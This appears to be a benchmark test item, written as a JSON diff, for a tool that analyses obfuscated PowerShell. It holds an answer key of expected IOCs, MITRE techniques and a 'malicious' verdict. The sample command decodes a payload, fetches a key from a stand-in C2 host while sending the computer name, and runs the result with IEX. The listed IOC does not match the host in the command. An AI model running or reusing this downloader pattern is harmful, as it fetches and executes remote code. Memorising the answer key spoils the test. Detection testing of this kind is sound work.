@@ -1,0 +1,47 @@
+{
+  "id": "multistage-downloader-3",
+  "category": "ps-crypto-multistage",
+  "algorithm": "Base64+GZip+AES-CBC (C2 key)",
+  "command_line": "$blob = [Convert]::FromBase64String('H4sIAAAAAAAAA0stSs4vy0zPzE7VMdE1MTU0MjK1MDG3AAABC3');$decompressed = New-Object IO.Compression.GZipStream([IO.MemoryStream]$blob, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader $decompressed; $payload = $reader.ReadToEnd(); # next stage \u2014 fetch encryption key from C2\n$c2 = 'http://benchmark.example/getkey?uid=' + $env:COMPUTERNAME; $key = (New-Object Net.WebClient).DownloadString($c2); # then AES-decrypt $payload with $key ...\nIEX $payload_decrypted",
+  "stage_ladder": [
+    {
+      "name": "base64-decode",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "gzip-decompress",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "c2-key-fetch",
+      "recoverable": false,
+      "reason": "Key is fetched at runtime from C2."
+    },
+    {
+      "name": "aes-cbc-decrypt",
+      "recoverable": false,
+      "reason": "Requires C2-fetched key."
+    }
+  ],
+  "key_status": "c2-derived",
+  "expected_plaintext": null,
+  "expected_iocs": [
+    "c2.example.io"
+  ],
+  "expected_lolbins": [
+    "powershell.exe"
+  ],
+  "expected_mitre": [
+    "T1027",
+    "T1140",
+    "T1071.001",
+    "T1059.001"
+  ],
+  "expected_verdict": "malicious",
+  "expected_confidence_min": 0.85,
+  "notes": "2/4 stages recoverable \u2014 the C2-key stage is by design non-recoverable.",
+  "source": "nivxray-rc41-crypto",
+  "license": "CC-BY-4.0"
+}
